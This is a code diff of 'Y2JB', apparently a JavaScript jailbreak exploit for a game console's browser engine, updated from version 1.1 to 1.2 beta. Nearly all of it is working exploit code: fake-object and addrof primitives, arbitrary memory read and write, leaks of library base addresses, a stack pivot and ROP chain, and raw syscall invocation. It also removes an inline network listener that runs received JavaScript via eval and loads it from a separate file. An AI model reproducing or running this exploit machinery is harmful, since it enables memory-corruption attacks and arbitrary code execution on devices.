@@ -25,10 +25,71 @@
 </head>
 <body>
     <script>
-        const version_string = "Y2JB 1.1 by Gezine";
+        const version_string = "Y2JB 1.2 beta by Gezine";
         
         let NETWORK_LOGGING = false;
         let LOG_SERVER = 'http://192.168.1.180:8080/log';
+        
+        // Global functions
+        let addrof;
+        let read64;
+        let write64;
+        let create_fakeobj;
+        let read8;
+        let write8;
+        let read16;
+        let write16;
+        let read32;
+        let write32;
+        let get_backing_store;
+        let malloc;
+        let write_string;
+        let alloc_string;
+        let pwn;
+        let get_bytecode_addr;
+        let call_rop;
+        let call;
+        let syscall;
+        let send_notification;
+        let sysctlbyname;
+        let get_fwversion;
+        
+        // Global objects
+        let allocated_buffers = [];
+        let eboot_base;
+        let libc_base;
+        let return_value_addr;
+        let libkernel_base;
+        let syscall_wrapper;
+        let firmwareVersion;
+        let rop_chain;
+        let fake_bc;
+        let fake_frame;
+        let return_value_buf;
+        let saved_fp = 0x0n;
+        
+        // File flags
+        let O_WRONLY = 0x1n;
+        let O_RDONLY = 0x0n;
+        let O_RDWR = 0x2n;
+
+        let SYSCALL = {
+            read: 0x3n,
+            write: 0x4n,
+            open: 0x5n,
+            close: 0x6n,
+            getuid: 0x18n,
+            getsockname: 0x20n,
+            accept: 0x1en,
+            socket: 0x61n,
+            connect: 0x62n,
+            bind: 0x68n,
+            setsockopt: 0x69n,
+            listen: 0x6an,
+            getsockopt: 0x76n,
+            sysctl: 0xcan,
+            netgetiflist: 0x7dn,
+        };
         
         async function checkLogServer() {
             try {
@@ -95,6 +156,12 @@
                     });
                 } catch (e) { }
             }
+        }
+
+        function loadScriptFromName(filename) {
+            const script = document.createElement('script');
+            script.src = filename;
+            document.head.appendChild(script);
         }
         
         function toHex(num) {
@@ -531,7 +598,7 @@
                 const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
                 
                 // Stable primitives
-                function addrof(obj) {
+                addrof = function(obj) {
                     const arr_elements_org = fake_rw[fake_array_slot0_offset];
                     fake_array[0] = obj;
                     const addr = fake_rw[fake_array_slot0_offset] - 1n;
@@ -539,7 +606,7 @@
                     return addr;
                 }
                 
-                function read64(addr) {
+                read64 = function(addr) {
                     const arr2_external_org = fake_rw[arr2_external_offset];
                     fake_rw[arr2_external_offset] = addr;
                     const value = fake_arr2[0];
@@ -547,14 +614,14 @@
                     return value;
                 }
                 
-                function write64(addr, value) {
+                write64 = function(addr, value) {
                     const arr2_external_org = fake_rw[arr2_external_offset];
                     fake_rw[arr2_external_offset] = addr;
                     fake_arr2[0] = value;
                     fake_rw[arr2_external_offset] = arr2_external_org;
                 }
                 
-                function create_fakeobj(addr) {
+                create_fakeobj = function(addr) {
                     const arr_elements_org = fake_rw[fake_array_slot0_offset];
                     fake_rw[fake_array_slot0_offset] = addr + 1n;
                     const fake_obj = fake_array[0];
@@ -562,13 +629,13 @@
                     return fake_obj;
                 }                
 
-                function read8(addr) {
+                read8 = function(addr) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
                 }
 
-                function write8(addr, value) {
+                write8 = function(addr, value) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     const mask = 0xFFn << BigInt(byte_offset * 8);
@@ -576,13 +643,13 @@
                     write64(addr & ~7n, new_qword);
                 }
 
-                function read16(addr) {
+                read16 = function(addr) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
                 }
                 
-                function write16(addr, value) {
+                write16 = function(addr, value) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     const mask = 0xFFFFn << BigInt(byte_offset * 8);
@@ -590,13 +657,13 @@
                     write64(addr & ~7n, new_qword);
                 }
                 
-                function read32(addr) {
+                read32 = function(addr) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
                 }
 
-                function write32(addr, value) {
+                write32 = function(addr, value) {
                     const qword = read64(addr & ~7n);
                     const byte_offset = Number(addr & 7n);
                     const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
@@ -604,16 +671,14 @@
                     write64(addr & ~7n, new_qword);
                 }
                 
-                function get_backing_store(typed_array) {
+                get_backing_store = function(typed_array) {
                     const obj_addr = addrof(typed_array);
                     const external = read64(obj_addr + 0x38n);
                     const base = read64(obj_addr + 0x40n);
                     return base + external;
                 }
                 
-                const allocated_buffers = [];
-                
-                function malloc(size) {
+                malloc = function(size) {
                     const buffer = new ArrayBuffer(size);
                     const buffer_addr = addrof(buffer);
                     const backing_store = read64(buffer_addr + 0x20n);
@@ -622,7 +687,7 @@
                 }
                 
                 // Write UTF-8 string to existing buffer
-                function write_string(addr, str) {
+                write_string = function(addr, str) {
                     const encoder = new TextEncoder();
                     const bytes = encoder.encode(str);
                     
@@ -633,7 +698,7 @@
                     write8(addr + BigInt(bytes.length), 0);
                 }
                 
-                function alloc_string(str) {
+                alloc_string = function(str) {
                     const encoder = new TextEncoder();
                     const bytes = encoder.encode(str);
                     const addr = malloc(bytes.length + 1);
@@ -656,7 +721,7 @@
                 
                 // Make bytecode larger and just use it's address
                 // No separate fake bytecode buffer
-                function pwn(x) {
+                pwn = function(x) {
                     let dummy1 = x + 1;
                     let dummy2 = x + 2;
                     let dummy3 = x + 3;
@@ -667,17 +732,17 @@
                 
                 pwn(1); // Generate bytecode
                 
-                function get_bytecode_addr() {
+                get_bytecode_addr = function() {
                     const pwn_addr = addrof(pwn); // JSFunction
                     const sfi_addr = read64(pwn_addr + 0x18n) - 1n; // SharedFunctionInfo
                     const bytecode_addr = read64(sfi_addr + 0x8n) - 1n; // BytecodeArray
                     return bytecode_addr;
                 }
                 
-                const rop_chain = create_fakeobj(fake_rop_chain_obj);
-                const fake_bc = create_fakeobj(fake_bc_obj);
-                const fake_frame = create_fakeobj(fake_frame_obj);
-                const return_value_buf = create_fakeobj(fake_return_value_obj);
+                rop_chain = create_fakeobj(fake_rop_chain_obj);
+                fake_bc = create_fakeobj(fake_bc_obj);
+                fake_frame = create_fakeobj(fake_frame_obj);
+                return_value_buf = create_fakeobj(fake_return_value_obj);
                 
                 //await log("fake_bc @ " + toHex(addrof(fake_bc)));
                 //await log("fake_frame @ " + toHex(addrof(fake_frame)));
@@ -691,10 +756,10 @@
                 const stack_addr = addrof(pwn(1)) + 0x1n;
                 await log("Stack leak @ " + toHex(stack_addr));
                 
-                const eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
+                eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
                 await log("eboot_base @ " + toHex(eboot_base));
                 
-                const libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
+                libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
                 await log("libc_base @ " + toHex(libc_base));
                 
                 const rop_chain_addr = get_backing_store(rop_chain);
@@ -710,17 +775,15 @@
                 // This sets the r14 register which V8 expects to point to bytecode
                 write64(fake_frame_backing + 0x21n, fake_bc_addr);
                 
-                const return_value_addr = get_backing_store(return_value_buf);
+                return_value_addr = get_backing_store(return_value_buf);
                 //await log("return_value_addr @ " + toHex(return_value_addr));
 
                 const fake_frame_addr = addrof(fake_frame);
                 // Pivot RSP
                 write64(fake_frame_addr + 0x09n, eboot_base + 0x49f7fn); // pop rsp ; ret
-                write64(fake_frame_addr + 0x11n, rop_chain_addr);    
+                write64(fake_frame_addr + 0x11n, rop_chain_addr);
 
-                let saved_fp = 0x0n;
-
-                function call_rop(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+                call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
                     let rop_i = 0;
                     
                     // Syscall number
@@ -761,7 +824,7 @@
                 }
                 
                 
-                function call(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
+                call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
                     // GC friendly
                     // Get new bytecode_addr each time
                     const bc_start = get_bytecode_addr() + 0x36n;
@@ -868,13 +931,13 @@
                     throw new Error("sceKernelGetModuleInfoFromAddr failed");
                 }
                 
-                const libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
+                libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
                 await log("libkernel_base @ " + toHex(libkernel_base));
 
-                const syscall_wrapper = gettimeofdayAddr + 0x7n;
+                syscall_wrapper = gettimeofdayAddr + 0x7n;
                 await log("syscall_wrapper @ " + toHex(syscall_wrapper));
                 
-                function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+                syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
                     // GC friendly
                     // Get new bytecode_addr each time
                     const bc_start = get_bytecode_addr() + 0x36n;
@@ -888,30 +951,7 @@
                     return return_value_buf[0];
                 }
                 
-                let SYSCALL = {
-                    read: 0x3n,
-                    write: 0x4n,
-                    open: 0x5n,
-                    close: 0x6n,
-                    getuid: 0x18n,
-                    getsockname: 0x20n,
-                    accept: 0x1en,
-                    socket: 0x61n,
-                    connect: 0x62n,
-                    bind: 0x68n,
-                    setsockopt: 0x69n,
-                    listen: 0x6an,
-                    getsockopt: 0x76n,
-                    sysctl: 0xcan,
-                    netgetiflist: 0x7dn,
-                };
-                
-                // File flags
-                const O_WRONLY = 0x1n;
-                const O_RDONLY = 0x0n;
-                const O_RDWR = 0x2n;
-                
-                function send_notification(text) {
+                send_notification = function(text) {
                     const notify_buffer_size = 0xc30n;
                     const notify_buffer = malloc(Number(notify_buffer_size));
                     const icon_uri = "cxml://psnotification/tex_icon_system";
@@ -950,200 +990,52 @@
                 }
                 
                 await checkLogServer();
-                send_notification(version_string);
                 
-                const AF_INET = 0x2n;
-                const SOCK_STREAM = 0x1n;
-                const SOL_SOCKET = 0xffffn;
-                const SO_REUSEADDR = 0x4n;
-                const MAXSIZE = 500 * 1024;
-
-                const sockaddr_in = malloc(16);
-                const addrlen = malloc(8);
-                const enable = malloc(4);
-                const len_ptr = malloc(8);
-                const payload_buf = malloc(MAXSIZE);
-
-                function get_current_ip() {
-                    // Get interface count
-                    const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
-                    if (count < 0) {
-                        return null;
+                sysctlbyname = function(name, oldp, oldp_len, newp, newp_len) {
+                    const translate_name_mib = malloc(0x8);
+                    const buf_size = 0x70;
+                    const mib = malloc(buf_size);
+                    const size = malloc(0x8);
+                    
+                    write64(translate_name_mib, 0x300000000n);
+                    write64(size, BigInt(buf_size));
+                    
+                    const name_addr = alloc_string(name);
+                    const name_len = BigInt(name.length);
+                    
+                    if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) < 0n) {
+                        throw new Error("failed to translate sysctl name to mib (" + name + ")");
                     }
                     
-                    // Allocate buffer for interfaces
-                    const iface_size = 0x1e0;
-                    const iface_buf = malloc(iface_size * count);
-                    
-                    // Get interface list
-                    if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
-                        return null;
+                    if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) < 0n) {
+                        return false;
                     }
                     
-                    // Parse interfaces
-                    for (let i = 0; i < count; i++) {
-                        const offset = BigInt(i * iface_size);
+                    return true;
+                }
+                
+                
+                get_fwversion = function() {
+                    const buf = malloc(0x8);
+                    const size = malloc(0x8);
+                    write64(size, 0x8n);
+                    
+                    if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
+                        const byte1 = Number(read8(buf + 2n));  // Minor version (first byte)
+                        const byte2 = Number(read8(buf + 3n));  // Major version (second byte)
                         
-                        // Read interface name (null-terminated string at offset 0)
-                        let iface_name = "";
-                        for (let j = 0; j < 16; j++) {
-                            const c = Number(read8(iface_buf + offset + BigInt(j)));
-                            if (c === 0) break;
-                            iface_name += String.fromCharCode(c);
-                        }
-                        
-                        // Read IP address (4 bytes at offset 0x28)
-                        const ip_offset = offset + 0x28n;
-                        const ip1 = Number(read8(iface_buf + ip_offset));
-                        const ip2 = Number(read8(iface_buf + ip_offset + 1n));
-                        const ip3 = Number(read8(iface_buf + ip_offset + 2n));
-                        const ip4 = Number(read8(iface_buf + ip_offset + 3n));
-                        const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-                        
-                        // Check if this is eth0 or wlan0 with valid IP
-                        if ((iface_name === "eth0" || iface_name === "wlan0") && 
-                            iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
-                            return iface_ip;
-                        }
+                        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
+                        return version;
                     }
                     
                     return null;
                 }
                 
-                function create_socket() {
-                    // Clear sockaddr
-                    for(let i = 0; i < 16; i++) write8(sockaddr_in + BigInt(i), 0);
-                    
-                    const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
-                    
-                    if (Number(sock_fd) < 0) {
-                        throw new Error("Socket creation failed: " + toHex(sock_fd));
-                    }
-                    
-                    write32(enable, 1);
-                    syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
-
-                    write8(sockaddr_in + 1n, AF_INET);
-                    write16(sockaddr_in + 2n, 0);        // port 0
-                    write32(sockaddr_in + 4n, 0);        // INADDR_ANY
-                    
-                    const bind_ret = syscall(SYSCALL.bind, sock_fd, sockaddr_in, 16n);
-                    if (bind_ret !== 0n) {
-                        throw new Error("Bind failed: " + toHex(bind_ret));
-                    }
-                                    
-                    const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
-                    if (listen_ret !== 0n) {
-                        throw new Error("Listen failed: " + toHex(listen_ret));
-                    }
-                    
-                    return sock_fd;
-                }
-
-                let sock_fd = null;
-                let port = 0;
-                let attempts = 0;
-                const MAX_ATTEMPTS = 60000;
+                firmwareVersion = get_fwversion();
                 
-                // Keep trying until we get port 50000 or reach max attempts
-                while (port !== 50000 && attempts < MAX_ATTEMPTS) {
-                    sock_fd = create_socket();
-                    
-                    // Get assigned port
-                    write32(len_ptr, 16);
-                    syscall(SYSCALL.getsockname, sock_fd, sockaddr_in, len_ptr);
-                    
-                    const port_be = read16(sockaddr_in + 2n);
-                    port = Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
-                    
-                    attempts++;
-                    
-                    if (port !== 50000 && attempts < MAX_ATTEMPTS) {
-                        syscall(SYSCALL.close, sock_fd);
-                    }
-                }
+                send_notification(version_string + "\nFW : " + firmwareVersion);
                 
-                const current_ip = get_current_ip();
-                const network_str = current_ip ? (current_ip + ":" + port) : ("port " + port);
-                
-                if (current_ip === null) {
-                    send_notification("No network available!\nAborting...");
-                    throw new Error("No network available!\nAborting...");
-                } else {
-                    await log("Remote JS Loader listening on " + network_str);
-                    send_notification("Remote JS Loader\nListening on " + network_str);
-                }
-                
-                const decoder = new TextDecoder('utf-8');
-                
-                while (true) {
-                    try {
-                        await log("Awaiting connection at " + network_str);
-                        
-                        write32(addrlen, 16);
-                        const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
-                        
-                        if (Number(client_fd) < 0) {
-                            await log("accept() failed: " + toHex(client_fd) + " - recreating socket");
-                            syscall(SYSCALL.close, sock_fd);
-                            sock_fd = create_socket();
-                            await log("Socket recreated");
-                            continue;
-                        }
-                        
-                        await log("Client connected, fd: " + Number(client_fd));
-                        
-                        let total_read = 0;
-                        let read_error = false;
-                        
-                        while (total_read < MAXSIZE) {
-                            const bytes_read = syscall(SYSCALL.read, client_fd, 
-                                payload_buf + BigInt(total_read), 
-                                BigInt(MAXSIZE - total_read));
-                            
-                            const n = Number(bytes_read);
-                            
-                            if (n === 0) {
-                                break;
-                            }
-                            if (n < 0) {
-                                await log("read() error: " + n);
-                                read_error = true;
-                                break;
-                            }
-                            
-                            await log("Read " + n + " bytes");
-                            total_read += n;
-                        }
-                        
-                        await log("Finished reading, total=" + total_read + " error=" + read_error);
-                        
-                        if (read_error || total_read === 0) {
-                            await log("No valid data received");
-                            syscall(SYSCALL.close, client_fd);
-                            continue;
-                        }
-                        
-                        const bytes = new Uint8Array(total_read);
-                        for (let i = 0; i < total_read; i++) {
-                            bytes[i] = Number(read8(payload_buf + BigInt(i)));
-                        }
-                        const js_code = decoder.decode(bytes);
-                        
-                        await log("Executing payload...");
-                        
-                        await eval(js_code);
-                        
-                        await log("Executed successfully");
-                        
-                        syscall(SYSCALL.close, client_fd);
-                        await log("Connection closed");
-                        
-                    } catch (e) {
-                        await log("ERROR in accept loop: " + e.message);
-                        await log(e.stack);
-                    }
-                }
+                loadScriptFromName('remotejsloader.js');
                 
             } catch (e) {                
                 await log('EXCEPTION: ' + e.message);
